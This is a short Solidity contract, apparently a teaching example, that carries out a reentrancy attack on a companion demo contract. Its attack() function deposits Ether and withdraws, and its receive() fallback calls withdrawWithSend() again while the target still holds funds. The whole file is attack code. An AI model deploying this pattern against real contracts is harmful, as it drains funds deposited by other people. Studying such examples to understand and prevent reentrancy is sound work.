// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./GoodContract.sol";

contract BadContract_Send {
    GoodContract public goodContract;

    constructor(address _goodContractAddress) {
        goodContract = GoodContract(_goodContractAddress);
    }

    // Function to receive Ether
    receive() external payable {
        if(address(goodContract).balance > 0) {
            goodContract.withdrawWithSend();
        }
    }

    // Starts the attack
    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdrawWithSend();
    }
}